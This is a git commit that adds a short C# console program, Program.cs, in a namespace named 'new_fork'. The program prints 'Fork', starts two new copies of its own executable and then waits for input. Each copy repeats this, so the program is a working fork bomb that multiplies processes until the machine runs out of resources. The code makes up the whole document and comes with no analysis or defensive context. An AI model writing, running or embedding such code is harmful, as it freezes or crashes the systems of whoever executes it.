877a89618843cbaf4ec1d79fcacc9c7c4e168583
Crack Wayne <82582198+CrackWayne@users.noreply.github.com>
2023-01-15 23:42:18 +0100

    Add files via upload

---
+++ Program.cs
@@ -0,0 +1,25 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+
+namespace new_fork
+{
+    internal class Program
+    {
+        static void Main(string[] args)
+        {
+
+            Console.WriteLine("Fork");
+            
+            
+            String name = System.Reflection.Assembly.GetExecutingAssembly().Location;
+            System.Diagnostics.Process.Start(name);
+            System.Diagnostics.Process.Start(name);
+            Console.Read();
+
+        }
+    }
+}
